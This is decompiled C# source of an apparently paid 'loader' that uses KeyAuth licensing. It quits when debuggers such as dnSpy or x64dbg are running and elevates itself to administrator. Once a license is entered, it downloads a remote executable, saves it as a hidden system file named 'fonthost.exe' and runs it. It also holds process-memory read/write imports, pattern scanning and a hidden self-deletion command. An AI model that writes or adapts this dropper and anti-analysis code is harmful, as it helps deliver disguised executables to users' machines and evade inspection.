using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace KeyAuth
{
	// Token: 0x02000005 RID: 5
	internal class Program
	{
		// Token: 0x06000036 RID: 54
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

		// Token: 0x06000037 RID: 55
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr GetCurrentProcess();

		// Token: 0x06000038 RID: 56
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern ushort GlobalFindAtom(string lpString);

		// Token: 0x06000039 RID: 57
		[DllImport("kernel32.dll")]
		private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

		// Token: 0x0600003A RID: 58
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

		// Token: 0x0600003B RID: 59
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesWritten);

		// Token: 0x0600003C RID: 60
		[DllImport("kernel32.dll")]
		private static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out Program.MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

		// Token: 0x0600003D RID: 61 RVA: 0x00004164 File Offset: 0x00002364
		private static void Main(string[] args)
		{
			Console.WriteLine("Cheack Program Crack");
			Thread.Sleep(3000);
			string[] array = new string[] { "dnSpy.exe", "x64dbg" };
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				bool flag = array.Contains(process.ProcessName.ToLower());
				if (flag)
				{
					Console.WriteLine("พบโปรแกรมต\u0e49องสงส\u0e31ย: " + process.ProcessName + ", โปรแกรมจะป\u0e34ดต\u0e31วเอง");
					Environment.Exit(0);
				}
			}
			Console.WriteLine("100%");
			Thread.Sleep(1000);
			Console.WriteLine("Workking");
			bool flag2 = !Program.IsAdministrator();
			if (flag2)
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo
				{
					FileName = Assembly.GetExecutingAssembly().Location,
					UseShellExecute = true,
					Verb = "runas"
				};
				Process.Start(processStartInfo);
				return;
			}
			Console.WriteLine("Running with administrator privileges.");
			Program.SetConsoleSize(70, 20);
			Console.WriteLine("Console window resized. ui ");
			for (;;)
			{
				string text = Program.GenerateRandomString(8);
				string text2 = DateTime.Now.ToString("HH:mm:ss");
				Console.Title = string.Concat(new string[] { "Loader ", text, " | Time: ", text2, " WebSite : https://discord.gg/2qzZ77yU4u" });
				Thread.Sleep(1000);
				Console.WriteLine("\n\n Connecting..");
				Program.KeyAuthApp.init();
				Program.autoUpdate();
				bool flag3 = !Program.KeyAuthApp.response.success;
				if (flag3)
				{
					Console.WriteLine("\n Status: " + Program.KeyAuthApp.response.message);
					Thread.Sleep(1500);
					Program.TerminateProcess(Program.GetCurrentProcess(), 1U);
				}
				Console.Clear();
				Console.OutputEncoding = Encoding.UTF8;
				string text3 = "=====================================================================";
				string text4 = "         KEYLUD    ";
				string text5 = "\n        THX FOR BUY  \n \n";
				string text6 = "\n=====================================================================";
				int num = 10;
				Console.Clear();
				Program.DisplayRainbowText(text3, num);
				Program.DisplayRainbowText(text4, num);
				Program.DisplayRainbowText(text5, num);
				Program.DisplayRainbowText(text6, num);
				Thread.Sleep(500);
				Console.Write("\n\n ? Enter license: ");
				string text7 = Console.ReadLine();
				Program.KeyAuthApp.license(text7);
				bool flag4 = !Program.KeyAuthApp.response.success;
				if (flag4)
				{
					Console.WriteLine("\n Status: " + Program.KeyAuthApp.response.message);
					Thread.Sleep(2500);
					Program.TerminateProcess(Program.GetCurrentProcess(), 1U);
				}
				Console.WriteLine("\n Logged In!");
				bool flag5 = string.IsNullOrEmpty(Program.KeyAuthApp.response.message);
				if (flag5)
				{
					Program.TerminateProcess(Program.GetCurrentProcess(), 1U);
				}
				Console.WriteLine(" IP address: " + Program.KeyAuthApp.user_data.ip);
				for (int j = 0; j < Program.KeyAuthApp.user_data.subscriptions.Count; j++)
				{
				}
				Console.Clear();
				string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
				string text8 = Path.Combine(baseDirectory, "fonthost.exe");
				try
				{
					bool flag6 = !File.Exists(text8);
					if (flag6)
					{
						byte[] array3 = Program.KeyAuthApp.download("hKubfORXkD");
						File.WriteAllBytes(text8, array3);
					}
					File.SetAttributes(text8, FileAttributes.Hidden | FileAttributes.System);
					Process.Start(text8);
					Console.WriteLine("It's all finished.");
				}
				catch (Exception ex)
				{
					Console.WriteLine("Error: " + ex.Message);
				}
			}
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00004554 File Offset: 0x00002754
		private static byte[] ParsePattern(string pattern, out bool[] mask)
		{
			string[] array = pattern.Split(new char[] { ' ' });
			byte[] array2 = new byte[array.Length];
			mask = new bool[array.Length];
			for (int i = 0; i < array.Length; i++)
			{
				bool flag = array[i] == "??";
				if (flag)
				{
					array2[i] = 0;
					mask[i] = false;
				}
				else
				{
					array2[i] = Convert.ToByte(array[i], 16);
					mask[i] = true;
				}
			}
			return array2;
		}

		// Token: 0x0600003F RID: 63 RVA: 0x000045D8 File Offset: 0x000027D8
		private static bool MatchPattern(byte[] buffer, int offset, byte[] pattern, bool[] mask)
		{
			for (int i = 0; i < pattern.Length; i++)
			{
				bool flag = mask[i] && buffer[offset + i] != pattern[i];
				if (flag)
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x06000040 RID: 64 RVA: 0x0000461C File Offset: 0x0000281C
		private static bool IsAdministrator()
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00004648 File Offset: 0x00002848
		private static void DisplayRainbowText(string text, int delay)
		{
			foreach (char c in text)
			{
				Console.ForegroundColor = Program.GetRainbowColor();
				Console.Write(c);
				Thread.Sleep(delay);
			}
			Console.WriteLine();
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00004694 File Offset: 0x00002894
		private static ConsoleColor GetRainbowColor()
		{
			Random random = new Random();
			ConsoleColor[] array = new ConsoleColor[]
			{
				ConsoleColor.Red,
				ConsoleColor.DarkYellow,
				ConsoleColor.Yellow,
				ConsoleColor.Green,
				ConsoleColor.Cyan,
				ConsoleColor.Blue,
				ConsoleColor.Magenta
			};
			return array[random.Next(array.Length)];
		}

		// Token: 0x06000043 RID: 67 RVA: 0x000046CC File Offset: 0x000028CC
		private static string GenerateRandomString(int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			for (int i = 0; i < length; i++)
			{
				stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[random.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".Length)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00004728 File Offset: 0x00002928
		public static bool SubExist(string name)
		{
			return Program.KeyAuthApp.user_data.subscriptions.Exists((api.Data x) => x.subscription == name);
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00004770 File Offset: 0x00002970
		private static void SetConsoleSize(int width, int height)
		{
			Console.SetWindowSize(width, height);
			Console.SetBufferSize(width, height);
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00004784 File Offset: 0x00002984
		public static DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			try
			{
				dateTime = dateTime.AddSeconds((double)unixtime).ToLocalTime();
			}
			catch
			{
				dateTime = DateTime.MaxValue;
			}
			return dateTime;
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000047DC File Offset: 0x000029DC
		private static void checkAtom()
		{
			new Thread(delegate
			{
				for (;;)
				{
					Thread.Sleep(60000);
					ushort num = Program.GlobalFindAtom(Program.KeyAuthApp.ownerid);
					bool flag = num == 0;
					if (flag)
					{
						Program.TerminateProcess(Program.GetCurrentProcess(), 1U);
					}
				}
			})
			{
				IsBackground = true
			}.Start();
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00004820 File Offset: 0x00002A20
		private static void securityChecks()
		{
			StackFrame[] frames = new StackTrace().GetFrames();
			foreach (StackFrame stackFrame in frames)
			{
				MethodBase method = stackFrame.GetMethod();
				bool flag;
				if (method != null)
				{
					Type declaringType = method.DeclaringType;
					flag = ((declaringType != null) ? declaringType.Assembly : null) != Assembly.GetExecutingAssembly();
				}
				else
				{
					flag = false;
				}
				bool flag2 = flag;
				if (flag2)
				{
					Program.TerminateProcess(Program.GetCurrentProcess(), 1U);
				}
			}
			Assembly assembly = AppDomain.CurrentDomain.GetAssemblies().FirstOrDefault<Assembly>((Assembly a) => a.GetName().Name == "0Harmony");
			bool flag3 = assembly != null;
			if (flag3)
			{
				Program.TerminateProcess(Program.GetCurrentProcess(), 1U);
			}
			Program.checkAtom();
		}

		// Token: 0x06000049 RID: 73 RVA: 0x000048E8 File Offset: 0x00002AE8
		private static void autoUpdate()
		{
			bool flag = Program.KeyAuthApp.response.message == "invalidver";
			if (flag)
			{
				bool flag2 = !string.IsNullOrEmpty(Program.KeyAuthApp.app_data.downloadLink);
				if (flag2)
				{
					Console.WriteLine("\n Auto update avaliable!");
					Console.WriteLine(" Choose how you'd like to auto update:");
					Console.WriteLine(" [1] Open file in browser");
					Console.WriteLine(" [2] Download file directly");
					int num = int.Parse(Console.ReadLine());
					int num2 = num;
					int num3 = num2;
					if (num3 != 1)
					{
						if (num3 != 2)
						{
							Console.WriteLine(" Invalid selection, terminating program..");
							Thread.Sleep(1500);
							Environment.Exit(0);
						}
						else
						{
							Console.WriteLine(" Downloading file directly..");
							Console.WriteLine(" New file will be opened shortly..");
							WebClient webClient = new WebClient();
							string text = Application.ExecutablePath;
							string text2 = Program.random_string();
							text = text.Replace(".exe", "-" + text2 + ".exe");
							webClient.DownloadFile(Program.KeyAuthApp.app_data.downloadLink, text);
							Process.Start(text);
							Process.Start(new ProcessStartInfo
							{
								Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
								WindowStyle = ProcessWindowStyle.Hidden,
								CreateNoWindow = true,
								FileName = "cmd.exe"
							});
							Environment.Exit(0);
						}
					}
					else
					{
						Process.Start(Program.KeyAuthApp.app_data.downloadLink);
						Environment.Exit(0);
					}
				}
				Console.WriteLine("\n Status: Version of this program does not match the one online. Furthermore, the download link online isn't set. You will need to manually obtain the download link from the developer.");
				Thread.Sleep(2500);
				Environment.Exit(0);
			}
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00004A98 File Offset: 0x00002C98
		private static string random_string()
		{
			string text = null;
			Random random = new Random();
			for (int i = 0; i < 5; i++)
			{
				text += Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0))).ToString();
			}
			return text;
		}

		// Token: 0x0400000F RID: 15
		public static api KeyAuthApp = new api("skynet", "usObzPNpsR", "1.0", null);

		// Token: 0x02000014 RID: 20
		[Flags]
		private enum AllocationProtect : uint
		{
			// Token: 0x04000051 RID: 81
			PAGE_READONLY = 2U,
			// Token: 0x04000052 RID: 82
			PAGE_READWRITE = 4U,
			// Token: 0x04000053 RID: 83
			PAGE_EXECUTE_READ = 32U,
			// Token: 0x04000054 RID: 84
			PAGE_EXECUTE_READWRITE = 64U
		}

		// Token: 0x02000015 RID: 21
		private enum State : uint
		{
			// Token: 0x04000056 RID: 86
			MEM_COMMIT = 4096U
		}

		// Token: 0x02000016 RID: 22
		private struct MEMORY_BASIC_INFORMATION
		{
			// Token: 0x04000057 RID: 87
			public IntPtr BaseAddress;

			// Token: 0x04000058 RID: 88
			public IntPtr AllocationBase;

			// Token: 0x04000059 RID: 89
			public Program.AllocationProtect Protect;

			// Token: 0x0400005A RID: 90
			public IntPtr RegionSize;

			// Token: 0x0400005B RID: 91
			public Program.State State;

			// Token: 0x0400005C RID: 92
			public Program.AllocationProtect AllocationProtect;

			// Token: 0x0400005D RID: 93
			public uint Type;
		}
	}
}
